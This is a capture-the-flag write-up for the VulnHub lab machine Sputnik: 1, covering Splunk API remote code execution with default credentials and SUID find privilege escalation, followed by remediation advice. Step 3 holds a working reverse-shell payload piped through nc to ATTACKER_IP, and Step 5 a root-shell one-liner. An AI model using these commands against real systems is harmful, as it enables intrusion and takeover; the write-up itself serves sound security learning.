# Sputnik: 1 — Writeup

| | |
|-|-|
| **Target IP** | 192.168.56.X (host-only) |
| **Difficulty** | Easy |
| **OS** | Linux |
| **Root Flag** | flag.txt in /root/ |
| **Source** | [VulnHub](https://www.vulnhub.com/entry/sputnik-1,301/) |

## Attack Summary

nmap → port 8089 (Splunk) → unauthenticated Splunk REST API → remote code execution → www-data shell → SUID find → root

## Methodology

1. Network discovery
2. Port scan — Splunk Universal Forwarder on port 8089
3. Splunk RCE via unauthenticated REST API (CVE-2011-4642 / SplunkWhisperer2)
4. Reverse shell as splunk/www-data
5. Privilege escalation via SUID binary

---

## Step 1: Network Discovery

```bash
sudo netdiscover -i eth1 -r 192.168.56.0/24
nmap -sV -sC -p- <TARGET_IP>
```

Open ports: 22 (SSH), 8089 (Splunk Universal Forwarder HTTPS).

---

## Step 2: Splunk Enumeration

The Splunk Universal Forwarder runs on port 8089. Check if the management API is accessible:

```bash
curl -k https://<TARGET_IP>:8089/services
```

The REST API is accessible without authentication — this is the attack surface.

---

## Step 3: Splunk Remote Code Execution

Use PySplunkWhisperer2 to exploit the unauthenticated Splunk API:

```bash
git clone https://github.com/cnotin/SplunkWhisperer2.git
cd SplunkWhisperer2/PySplunkWhisperer2

# Set up listener
nc -lvnp 1234 &

# Execute reverse shell via Splunk
python3 PySplunkWhisperer2_remote.py \
  --host <TARGET_IP> \
  --port 8089 \
  --username admin \
  --password changeme \
  --payload "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER_IP 1234 >/tmp/f" \
  --lhost ATTACKER_IP
```

Shell received as `splunk` or `www-data`.

---

## Step 4: Stabilize Shell

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
# Ctrl-Z → background
stty raw -echo; fg
```

---

## Step 5: Privilege Escalation via SUID

```bash
find / -perm -4000 -type f 2>/dev/null
```

`/usr/bin/find` has SUID bit set. Use it to spawn a root shell:

```bash
/usr/bin/find . -exec /bin/sh -p \; -quit
id
# uid=0(root)
cat /root/flag.txt
```

---

## Lessons Learned

1. **Splunk Universal Forwarder unauthenticated API** — the management port (8089) should require authentication; default credentials (`admin:changeme`) must be changed
2. **Splunk RCE via REST** — the `deployment-apps` endpoint allows executing arbitrary OS commands on the forwarder host
3. **SUID find binary** — `find` should never have the SUID bit set; even if the initial shell is limited, SUID find is a trivial privesc path
4. **Management interfaces on network-accessible ports** — admin/management APIs should be bound to localhost or protected by firewall rules

## Remediation

| Vulnerability | Fix |
|---------------|-----|
| Splunk unauthenticated API | Set a strong password for the Splunk admin account; enable auth on port 8089 |
| Splunk default credentials | Change `admin:changeme` immediately after installation |
| SUID find | `chmod u-s /usr/bin/find`; audit all SUID binaries with `find / -perm -4000` |
| Exposed management port | Firewall port 8089 to trusted admin IPs only |
